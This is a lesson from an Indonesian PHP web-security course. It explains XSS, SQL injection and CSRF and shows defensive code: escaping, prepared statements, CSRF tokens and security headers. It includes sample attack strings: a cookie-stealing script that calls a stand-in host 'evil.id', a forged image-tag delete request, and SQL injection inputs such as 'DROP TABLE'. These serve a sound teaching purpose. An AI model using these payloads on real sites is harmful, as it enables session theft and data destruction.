# 22. XSS, SQL Injection, CSRF — Tiga Ancaman Utama

> **Level 5 · Keamanan Komprehensif dan Autentikasi** — Materi sebelumnya menerapkan pencegahan per-kasus; sekarang kamu melihat *anatomi* ketiganya sekaligus.

---

## 1. Penjelasan Singkat & Konsep Dasar

Tiga serangan web teratas mengeksploitasi satu kelemahan yang sama: **aplikasi terlalu percaya pada data yang bisa dikendalikan penyerang**. Bedanya hanya di *titik masuk* dan *titik eksekusi*:

### 1. XSS (Cross-Site Scripting)
Penyerang menyisipkan **script (JavaScript)** yang dijalankan **di browser user lain**.

```
User submit "bio" → <script>fetch('//evil.id?c='+document.cookie)</script>
Aplikasi tampilkan mentah → browser user lain mengeksekusi script → cookie/aksi dicuri
```

**Mengurangi dampak:** cegah output — `htmlspecialchars()`/`esc()`.

### 2. SQL Injection (SQLi)
Penyerang menyisipkan **kode SQL** yang dijalankan **di database**.

```
?id=1 OR 1=1 → query jadi "WHERE id = 1 OR 1=1" → seluruh baris bocor / bisa DELETE
```

**Mengurangi dampak:** jangan campur nilai ke string SQL — **prepared statement** (materi 21).

### 3. CSRF (Cross-Site Request Forgery)
Penyerang membuat **request "palsu"** dari situs lain, memanfaatkan **session/cookie user yang sudah login** untuk mengeksekusi aksi (mengubah email, transfer, hapus) tanpa sadar.

```
User login di perpustakaan (session aktif) → buka situs jahat
Situs jahat: <img src="http://perpustakaan/buku/hapus.php?id=5">
Browser user mengirim request tsb DENGAN cookie session → buku terhapus tanpa disadari
```

**Mengurangi dampak:** **token CSRF** + verifikasi method (POST untuk aksi mutasi), dan `SameSite` cookie (materi 16).

**Benang Merah:** ketiganya sudah "dicegah" tempel-tempel di Level 3-4 (`esc`, prepared, CSRF). Materi ini mempersatukan pola pikirnya menjadi satu *mindset keamanan* dan menambahkan lapisan pertahanan (security headers). Level 5 selanjutnya memperkuat auth (23) dan upload (24).

## 2. Fungsi & Kegunaan Utama

Mengapa fitur-fitur di bawah ini *ada*:

- **`htmlspecialchars`** — PHP menyediakan untuk membuat output HTML "netral": `<script>` jadi `&lt;script&gt;`, tidak dieksekusi. Ini garis pertahanan XSS.
- **Prepared statements (PDO)** — PDO dibuat untuk masalah ini: pisah struktur vs nilai (materi 20-21). Garis pertahanan SQLi.
- **CSRF token** — kedua pengaman di atas tidak akan menolong CSRF karena serangannya bukan soal *nilai* melainkan soal *otorisasi request*. Token membuktikan "request ini memang berasal dari form saya".
- **Security headers** — header HTTP tambahan memberitahu browser untuk memblokir perilaku berbahaya (clickjacking, MIME sniffing, script lintas situs) — lapisan *discipline* di luar PHP.
- Bersama-sama: **defense in depth** — setiap lapis bukan pengganti yang lain.

## 3. Contoh Kode & Implementasi Real-World

### 1) XSS — escape by context

```php
<?php
// File: functions/helpers.php
/** Escape untuk konteks HTML (tag & attribute). */
function esc(mixed $nilai, int $flags = ENT_QUOTES | ENT_HTML5): string {
    return htmlspecialchars((string) $nilai, $flags, 'UTF-8');
}
```

**Escape berdasarkan konteks (aturan penting):**

```php
// Dalam HTML tag & attribute:
echo esc($nama);                       // <script> → &lt;script&gt;

// Dalam JavaScript (data untuk JS di halaman):
$dataJs = json_encode($buku, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
echo "<script>const buku = {$dataJs};</script>";

// Dalam URL:
echo urlencode($query);                // spasi → %20
```

**Header keamanan (jangan dilewat):**

```php
<?php
// File: functions/headers.php
function setSecurityHeaders(): void {
    header('X-Content-Type-Options: nosniff');                 // cegah MIME sniffing
    header('X-Frame-Options: DENY');                           // cegah clickjacking
    header('X-XSS-Protection: 1; mode=block');                 // helper browser lama
    header('Referrer-Policy: strict-origin-when-cross-origin');
    // Production HTTPS:
    // header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
}
```

### 2) SQL Injection — prepared statement (ringkas)

```php
<?php
// ❌ Rentan
$id = $_GET['id'];
$sql = "SELECT * FROM buku WHERE id = $id";   // sql injection jika id berisi input jahat

// ✅ Aman
$id = (int) ($_GET['id'] ?? 0);
$stmt = $pdo->prepare("SELECT * FROM buku WHERE id = :id");
$stmt->execute([':id' => $id]);
```

### 3) CSRF — token per form + per action

```php
<?php
// File: functions/csrf.php (materi 14 diperluas)

function generateCsrfToken(): string {
    if (session_status() === PHP_SESSION_NONE) {
        throw new RuntimeException('Session belum dimulai.');
    }
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verifyCsrfToken(string $token): bool {
    return !empty($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}
```

```html
<!-- Di form POST -->
<form method="POST" action="buku/hapus.php">
    <input type="hidden" name="csrf_token" value="<?= esc(generateCsrfToken()) ?>">
    <input type="hidden" name="id" value="5">
    <button type="submit">Hapus</button>
</form>
```

```php
<?php
// buku/hapus.php — verifikasi method + token (bukan hanya token)
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !verifyCsrfToken($_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    die('Forbidden');
}
// ... true deletion ...
```

> **Pola kunci CSRF:** aksi yang *mengubah data* (hapus, simpan, logout) hanya boleh lewat **POST + token** → request `<img src=...>` (GET) tidak bisa mengeksekusi.

## 4. Analogi Sederhana

Dalam **Sistem Administrasi Kantor** — tiga jenis "penipuan" yang harus ditangkal staf:

1. **XSS** = penyerang menyelipkan **tulisan berpengaruh** pada dokumen yang akan dipajang di papan pengumuman — jika karyawan membaca tulisan itu, *perintah tersembunyi* di dalamnya bisa dieksekusi di papan itu (browser user lain). **Cegah**: selalu *escaping* tulisan agar yang terpajang hanyalah teks (menyembunyikan tanda `<>` sebagai teks).
2. **SQLi** = penyerang **menulis instruksi** pada kolom isian surat izin, sehingga surat itu sekaligus menjadi "berkas perintah eksekusi" di gudang arsip (database). **Cegah**: formulir punya kolom resmi yang hanya menerima *isi*, bukan *instruksi* (prepared statement).
3. **CSRF** = penyerang membuat **surat atas nama pegawai** yang sah (session aktif) dan mengirimkannya dari *kantor lain* — staf penerima mengira itu permintaan asli. **Cegah**: misi permintaan asli selalu membawa **cap segel token** yang hanya dikeluarkan kantor ini; surat tanpa segel = tolak.

Tambahannya, **security headers** = *aturan main di papan depan gedung* ("konten berbahaya dari luar tidak boleh masuk melalui jendela browser"), menyiapkan lapisan kedua.

## 5. Kapan Harus Digunakan & Kasus Penggunaan

- **Tatap muka dengan input user** — setiap `$_GET`/`$_POST` yang akan ditampilkan, di-query, atau memicu aksi.
- **XSS**: semua output dinamis (nama user, komentar, parameter query di URL) → `esc()`.
- **SQLi**: semua query dengan nilai berubah → prepared (tidak terkecuali).
- **CSRF**: **semua form POST** (login, tambah, edit, hapus, logout, ubah password).
- **Security headers**: di awal semua request (bisa jadi di `public/index.php` atau middleware, materi 26).
- **Kasus nyata**: gunakan semuanya dalam satu halaman — form tambah buku: token CSRF di form, validasi input, prepared statement saat simpan, `esc()` saat tampil, headers aktif di seluruh site.

---

## 6. Aspek Keamanan & Best Practices (Critical)

- **Tiga garis berbeda, jangan dicampur**: XSS = escape *output*; SQLi = prepared *query*; CSRF = token *form*. Membersihkan input tidak menggantikan salah satu.
- **`validate` ≠ `escape`**: validasi memastikan data benar; escape membuat data netral. Keduanya berjalan beriringan.
- **Jangan pernah membungkus ganda** (`htmlspecialchars(htmlspecialchars(...))`) — hasil berantakan; escape sekali di titik output akhir.
- **`header()` sebelum output apapun** — security headers harus dikirim lebih dulu (jika kamu memulai output, header tak bisa diubah — kait dengan materi 16 & `.htaccess`).
- **Cookie `SameSite=Strict` + CSRF token** — dua lapis: cookie tidak dikirim lintas-situs, token menjadi bukti tambahan request sah.
- **Content Security Policy** — lapisan terkuat untuk XSS (browser memblokir script inline/cross-origin). Mulai dari `default-src 'self'` untuk aplikasi internal.

---

## 7. Kesalahan Umum & Debugging

- **XSS muncul walaupun sudah di-escape** — sering karena: meng-escape di tempat *lain* (bukan titik output), memakai `htmlspecialchars` tanpa `ENT_QUOTES`, atau *konteks beda* (escape di HTML tidak aman untuk atribut `onclick=`, URL, atau isi `<script>`). Konsisten pakai `esc()` (dengan flag benar).
- **SQLi tetap lolos string filter** — `addslashes`/`real_escape_string` tidak tam lihat bind-nya; gunakan **prepared statement native**. Kalau masih ada concat input ke SQL → itulah celahnya (penuhi whitelist untuk bagian struktural, materi 21).
- **CSRF saya bounce terus** — pastikan token di-generate *saat render form* dan diverifikasi *di handler POST yang sama session*, gunakan `hash_equals` (bukan `==`), dan jangan lupa `session_start()` sebelumnya.
- **Header tidak terkirim** — `header('X-Frame-Options: ...')` setelah output sebelumnya; lakukan di paling atas file / middleware.
- **Lisensi debugging**: bila ragu, periksa request di browser devtools → lihat apakah cookie terkirim, URL, dan isi header. Untuk melihat efek header, buka halaman di `curl -I http://localhost/perpustakaan`.

## 8. Soal Latihan & Kunci Jawaban

### Tantangan 1
Buat halaman profil anggota yang menampilkan `$bio` (dari DB/user) dengan aman terhadap XSS; tampilkan juga tanggal; tambahkan header keamanan; dan sebuah form "ganti bio" yang aman terhadap CSRF (POST + token) — lengkap dengan validasi panjang 500 karakter.

### Tantangan 2
Seorang penyerang mengirim `?id=3;DROP TABLE buku;--`. Jelaskan apa yang terjadi pada aplikasi: (a) jika query memakai concat; (b) jika memakai prepared statement. Lalu, mengapa `(int)` cast tidak membuat concat jadi aman terhadap *semua* kasus?

### Jawaban & Pembahasan

**Tantangan 1**

```php
<?php
// profil.php
session_start();
require_once 'functions/helpers.php';
require_once 'functions/csrf.php';

setSecurityHeaders();   // dari materi ini

// Ambil bio dari DB (dalam proyek: repo->findById)
$bio = '<script>alert("xss")</script> Saya suka baca buku';
$nama = 'Sari';
?>
<h1>Profil <?= esc($nama) ?></h1>
<p>Bio: <?= esc($bio) ?></p>

<form method="POST">
    <input type="hidden" name="csrf_token" value="<?= esc(generateCsrfToken()) ?>">
    <textarea name="bio" maxlength="500"><?= esc($_POST['bio'] ?? '') ?></textarea>
    <button type="submit">Simpan</button>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!verifyCsrfToken($_POST['csrf_token'] ?? '')) { http_response_code(403); die('Forbidden'); }
    $bioBaru = (string) ($_POST['bio'] ?? '');
    if (mb_strlen($bioBaru) > 500) {
        die('Bio maksimal 500 karakter.');
    }
    // ... $repo->updateBio($userId, $bioBaru); setFlash(...); redirect ...
}
?>
```

> **Pembahasan alur:** Header keamanan dikirim sebelum output. Saat tampil, `esc()` membuat `<script>` menjadi teks polos (XSS dinonaktifkan). Form POST membawa CSRF token; handler memverifikasi token → validasi panjang → simpan → redirect (PRG). Eksport: perhatikan bahwa `$_POST['bio']` yang disimpan adalah data mentah — keamanan ada di *output* (`esc()`), bukan di "membersihkan" sebelum simpan. Inilah prinsip XSS prevention yang benar.

**Tantangan 2**

- (a) **Concat**: `"SELECT * FROM buku WHERE id = " . "3;DROP TABLE buku;--"` menghasilkan SQL yang menggabungkan dua pernyataan; banyak driver MySQL mengeksekusi `DROP TABLE` (atau setidaknya sintaks `--` mengkomen sisa query). Efeknya destruktif.
- (b) **Prepared**: nilai `3;DROP TABLE buku;--` dikirim sebagai *parameter*, bukan bagian SQL. MySQL memperlakukannya sebagai nilai `id` — hasil: tidak ada baris dengan id semacam itu, tanpa efek samping. SQL injection gagal total.
- **Kenapa `(int)` cast tidak "cukup" untuk semua kasus**: `(int)` menetralkan *jenis angka* (contoh untuk id/halaman), tapi hanya sampai nilainya benar numerik. Banyak kolom lain (judul, kategori, email) *harus* string — di situ `(int)` tak berguna, dan concat membuka injeksi. Lebih jauh, mengikuti "cast" sebagai pengganti prepared adalah menyimpan kebiasaan berbahaya yang cepat meninggalkan celah di satu tempat yang terlewat. Satu-satunya garis yang konsisten: **prepared statement untuk semua nilai** — plus whitelist untuk bagian struktural.

> **Pembahasan:** Inilah mengapa rule #4 roadmap keras tanpa pengecualian: bukan hanya untuk keamanan, tapi karena *konsistensi* menghilangkan "satu tempat yang terlupa".
